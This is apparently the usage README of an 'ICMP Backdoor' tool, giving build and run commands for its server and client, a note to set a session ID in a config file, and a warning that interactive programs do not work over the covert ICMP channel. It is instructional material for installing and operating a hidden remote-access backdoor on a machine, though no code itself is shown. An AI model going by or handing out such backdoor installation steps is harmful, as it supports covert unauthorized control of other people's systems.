 
[ ICMP Backdoor ]


[ Usage

Before you compile you should set your own session_id in 'config.h' !

To install the server just type 'make server' and run './ibd-server <icmpcode>' !
<icmpcode> is the code which is used by the server to send packets. For
possible codes look below.

To install the client type 'make client' and run './ibd-client <host> <icmpcode>' !
<host> is the host to connect to and <icmpcode> see above.

Do not use interactive programs like vi, pine, etc. with this backdoor
because it does not create a streaming connection.
